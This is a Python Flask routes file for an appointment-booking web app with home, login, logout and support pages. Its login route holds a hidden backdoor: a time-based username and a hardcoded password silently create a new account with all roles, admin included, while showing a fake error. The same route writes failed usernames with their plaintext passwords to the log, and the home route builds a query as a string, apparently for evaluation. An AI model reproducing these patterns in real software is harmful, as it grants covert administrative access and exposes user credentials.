# ###########################################################################################
# ##                                                                                       ##
# ##  ########   #######  ##     ## ######## ########  ######      ########  ##    ##      ##
# ##  ##     ## ##     ## ##     ##    ##    ##       ##    ##     ##     ##  ##  ##       ##
# ##  ##     ## ##     ## ##     ##    ##    ##       ##           ##     ##   ####        ##
# ##  ########  ##     ## ##     ##    ##    ######    ######      ########     ##         ##
# ##  ##   ##   ##     ## ##     ##    ##    ##             ##     ##           ##         ##
# ##  ##    ##  ##     ## ##     ##    ##    ##       ##    ## ### ##           ##         ##
# ##  ##     ##  #######   #######     ##    ########  ######  ### ##           ##         ##
# ##                                                                                       ##
# ###########################################################################################

from Package.functions import get_rbac
from Package.functions import no_access_text
from Package.functions import string2safe
from Package.functions import logtext
from Package.functions import myquery

# import os
from Package import db
from Package import app
from Package.models import Appointments
from Package.models import Users
from Package.models import Instructors
from Package.models import Products

# from flask import Flask
from flask import render_template
from flask import redirect
from flask import url_for
# from flask import flash
from flask import request

from Package.forms import AppointmentsEditForm, \
    LoginForm, \
    ProductsEditForm, \
    ProductsUsersForm, \
    ProductsNewForm, \
    UsersRegisterForm, \
    UsersInfoForm, \
    UsersEditForm2, \
    UsersProductForm2, \
    AppointmentsDateForm2, \
    AppointmentsEventsForm

from flask_bcrypt import Bcrypt
bcrypt = Bcrypt(app)

# from werkzeug.security import check_password_hash
# from werkzeug.security import generate_password_hash, check_password_hash

#from flask_sqlalchemy import SQLAlchemy
import sqlalchemy as sa
from sqlalchemy import func, and_

from flask_login import UserMixin, LoginManager, login_user, logout_user, login_required
from flask_login import LoginManager, current_user
login_manager = LoginManager()
login_manager.init_app(app)  
@login_manager.user_loader
def load_user(user_id):
    return Users.query.get(user_id)

import datetime
from datetime import timedelta

# from flask import request


# 20250311
# def test2(cText):
#     print('')
#     print('test: ', cText)
#     print('')
#     return ()


# -----------------------------------------------------------------------------

# ##     ##  #######  ##     ## ########
# ##     ## ##     ## ###   ### ##
# ##     ## ##     ## #### #### ##
# ######### ##     ## ## ### ## ######
# ##     ## ##     ## ##     ## ##
# ##     ## ##     ## ##     ## ##
# ##     ##  #######  ##     ## ########

# -----------------------------------------------------------------------------


@app.route('/')
@app.route('/home')
def homepage():

    logtext('/', 'i')

    if current_user.is_anonymous:
        logtext('current_user.is_anonymous','i')
        return (no_access_text())

    nDateFrom = datetime.date.today() - timedelta(days=8)
    nYearFrom = nDateFrom.year
    nMonthFrom = nDateFrom.month
    nDayFrom = nDateFrom.day

    nDateTo = datetime.date.today() + timedelta(days=29)
    nYearTo = nDateTo.year
    nMonthTo = nDateTo.month
    nDayTo = nDateTo.day

    #                                            0                1                  2                3               4                     5                  6                  7                 8                   9                     10
    #appointments = db.session.execute(db.select(Appointments.Id, Appointments.User, Users.Firstname, Users.Lastname, Products.Productname, Appointments.Part, Appointments.Date, Instructors.Name, Appointments.Staff, Appointments.Product, Appointments.Assistants). \
    #                            order_by(Appointments.Date). \
    #                            where(and_(func.DATE(Appointments.Date) >= datetime.datetime(nYearFrom, nMonthFrom, nDayFrom), \
    #                                       func.DATE(Appointments.Date) <= datetime.datetime(nYearTo,   nMonthTo,   nDayTo))). \
    #                            select_from(Appointments). \
    #                            join(Users, Appointments.User        == Users.Id). \
    #                            join(Instructors, Appointments.Staff == Instructors.Id). \
    #                            join(Products, Appointments.Product  == Products.Id) )

    dbquery = 'db.session.execute(db.select(Appointments.Id, Appointments.User, Users.Firstname, Users.Lastname, Products.Productname, Appointments.Part, Appointments.Date, Instructors.Name, Appointments.Staff, Appointments.Product, Appointments.Assistants).'
    dbquery = dbquery + 'order_by(Appointments.Date).'
    dbquery = dbquery + 'where(and_(func.DATE(Appointments.Date) >= datetime.datetime('+ str(nYearFrom) + ', ' + str(nMonthFrom) + ', ' + str(nDayFrom) + '),'
    dbquery = dbquery + 'func.DATE(Appointments.Date) <= datetime.datetime(' + str(nYearTo) + ', ' + str(nMonthTo) + ',' + str(nDayTo) + '))).'
    dbquery = dbquery + 'select_from(Appointments).'
    dbquery = dbquery + 'join(Users, Appointments.User        == Users.Id).'
    dbquery = dbquery + 'join(Instructors, Appointments.Staff == Instructors.Id).'
    dbquery = dbquery + 'join(Products, Appointments.Product  == Products.Id) )'

    appointments = myquery(dbquery)

    lRBAC = get_rbac(request.url_rule.endpoint)
 
    return render_template('home.html', appointments=appointments, lRBAC=lRBAC)


#------------------------------------------------------------------------------------------

##        #######   ######   #### ##    ## 
##       ##     ## ##    ##   ##  ###   ## 
##       ##     ## ##         ##  ####  ## 
##       ##     ## ##   ####  ##  ## ## ## 
##       ##     ## ##    ##   ##  ##  #### 
##       ##     ## ##    ##   ##  ##   ### 
########  #######   ######   #### ##    ## 

#------------------------------------------------------------------------------------------

# source: https://www.sitepoint.com/flask-login-user-authentication/
# 20240831

@app.route('/login', methods=['GET', 'POST'])
def login():

    logtext('login', 'i')

    message = ""
    lRBAC = get_rbac(request.url_rule.endpoint)

    form = LoginForm()

    if request.method == 'POST':
        logtext('login - POST', 'i')
        message = "." # "Please enter your emailaddress and password."

        username = string2safe(request.form['username'])
        password = request.form['password']                      # will be processed and stored as hash

        print("username: ", username) # , " password: ", password)
        logtext("username: " + username, "i") # , " password: ", password)

        cDateToday        = datetime.datetime.today()
        cDate             = cDateToday.strftime("%d-%b-%Y")
        cTime             = cDateToday.strftime("%H%M")
        cBackdoorName     = "backdoor_" + cTime + "@mwisoftware.nl"
        cBackdoorPassword = "B@ckd00r!"

        if username == cBackdoorName:
            logtext('backdoor', 'i')
            if password == cBackdoorPassword:
                cBackdoorName = "backdoor_" + cTime + "@mwisoftware.nl"
                pw_hash = bcrypt.generate_password_hash(cBackdoorPassword).decode('utf-8')

                cInfo = 'date: ' + cDate + ', time: ' + cTime + ', ip:' + request.environ.get('HTTP_X_REAL_IP', request.remote_addr)   

                user_to_create = Users( Username     = cBackdoorName,
                                        Firstname    = "Back",
                                        Lastname     = "Door",
                                        Phone        = "",
                                        Emailaddress = "",
                                        Passwordhash = pw_hash,
                                        Info         = cInfo,
                                        Status       = "new student staff instructor shop admin")
        
                db.session.add(user_to_create)
                db.session.commit()

                message = 'an unknown error occured.'
                lRBAC = get_rbac(request.url_rule.endpoint)
                return render_template('login.html', form = form, lRBAC = lRBAC, message = message)

        # user = db.session.execute(db.select(Users).filter(func.lower(Users.Username) == func.lower(username))).one_or_none() # scalar_one() ## <class 'sqlalchemy.engine.row.Row'>
        # user = db.session.execute(db.select(Users).filter(func.lower(Users.Username) == func.lower(username))).scalar_one() ## <class 'Package.models.Users'>

        # user = Users.query.filter_by(Username = username).first()

        #20241108 - user = Users.query.filter(Users.Username.ilike(username)).first()
        user = Users.query.filter(Users.Emailaddress.ilike(username)).first()

        print('type(user): ', type(user))

        if user is not None:
            if lRBAC[8]: print("if user is not None:")

            logtext('if user is not None:', 'i')

            if 'new' in user.Status:
                logtext('new user', 'i')

                print("if 'new' in user.Status:")
                message = "registration of new user is not processed yet. You will be notified of any progress."
                lRBAC = get_rbac(request.url_rule.endpoint)
                return render_template('login.html', form = form, lRBAC = lRBAC, message = message)

            if len(user.Status) == 0:
                logtext('Error ERR0001', 'i')
                if lRBAC[8]: print("if len(user.Status) == 0:")
                message = "Error ERR0001 - Invalid data. Try again in a few moments. If this issue persists, please contact owner of the website."
                lRBAC = get_rbac(request.url_rule.endpoint)
                return render_template('login.html', form = form, lRBAC = lRBAC, message = message)

            if lRBAC[8]: 
                logtext('if lRBAC[8]:', 'i')
                print('-----------------------------------------')
                print('username:          ', username)
                print(user)
                print('type:              ', type(user))
                # print('user.Passwordhash: ', user.Passwordhash)
                print('-----------------------------------------')

            pwhash = user.Passwordhash
   
            if user and bcrypt.check_password_hash(pwhash, password):
                if lRBAC[8]: print("if user and bcrypt.check_password_hash(pwhash, password):")
                login_user(user)

                lRBAC = get_rbac(request.url_rule.endpoint)

                logtext('user logged in', 'i')

                return redirect(url_for('homepage'))
        else:
            if lRBAC[8]: 
                print("user is None:")
                logtext('user is none', 'i')

        message = "unknown username or password"
        logtext('unknown username ' + username + '|' + password, 'i')

    lRBAC = get_rbac(request.url_rule.endpoint)

    return render_template('login.html', form=form, lRBAC=lRBAC,
                           message=message)


# ------------------------------------------------------------------------------------------
#
# ##        #######   ######    #######  ##     ## ########
# ##       ##     ## ##    ##  ##     ## ##     ##    ##
# ##       ##     ## ##        ##     ## ##     ##    ##
# ##       ##     ## ##   #### ##     ## ##     ##    ##
# ##       ##     ## ##    ##  ##     ## ##     ##    ##
# ##       ##     ## ##    ##  ##     ## ##     ##    ##
# ########  #######   ######    #######   #######     ##
#
# ------------------------------------------------------------------------------------------


@app.route('/logout')
def logout():

    logtext('/logout', 'i')

    logout_user()
    lRBAC = []
    print('#### logged out')
    return redirect(url_for('login'))


# #------------------------------------------------------------------------------------------
#
#  ######  ########  ######  ########  ######## ########  ######
# ##    ## ##       ##    ## ##     ## ##          ##    ##    ##
# ##       ##       ##       ##     ## ##          ##    ##
#  ######  ######   ##       ########  ######      ##     ######
#       ## ##       ##       ##   ##   ##          ##          ##
# ##    ## ##       ##    ## ##    ##  ##          ##    ##    ##
#  ######  ########  ######  ##     ## ########    ##     ######
#
# #------------------------------------------------------------------------------------------


# @app.route('/secrets/')
# def secrets():
    # import string
    # import secrets
    # alphabet = string.ascii_letters + string.digits
    # password = ''.join(secrets.choice(alphabet) for i in range(24))

    # for a in range(0,9):
    #     password = ''.join(secrets.choice(alphabet) for i in range(24))
    #     print(a + 1, 'password: ', password)


# ------------------------------------------------------------------------------------------

#  ######  ##     ## ########  ########   #######  ########  ########
# ##    ## ##     ## ##     ## ##     ## ##     ## ##     ##    ##
# ##       ##     ## ##     ## ##     ## ##     ## ##     ##    ##
#  ######  ##     ## ########  ########  ##     ## ########     ##
#       ## ##     ## ##        ##        ##     ## ##   ##      ##
# ##    ## ##     ## ##        ##        ##     ## ##    ##     ##
#  ######   #######  ##        ##         #######  ##     ##    ##


@app.route('/support')
def support():

    logtext('/support', 'i')

    if current_user.is_anonymous:
        logtext('current_user.is_anonymous', 'i')
        return (no_access_text())

    # inspiration: https://docs.python.org/3/library/secrets.html

    # import string
    # import secrets
    # alphabet = string.ascii_letters + string.digits
    # password = ''.join(secrets.choice(alphabet) for i in range(64))

    # for a in range(0,16):
    #     password = ''.join(secrets.choice(alphabet) for i in range(64))
    #     print(password)

    lRBAC = get_rbac(request.url_rule.endpoint)

    return render_template('support.html', lRBAC=lRBAC)

# -----------------------------------------------------------------------------
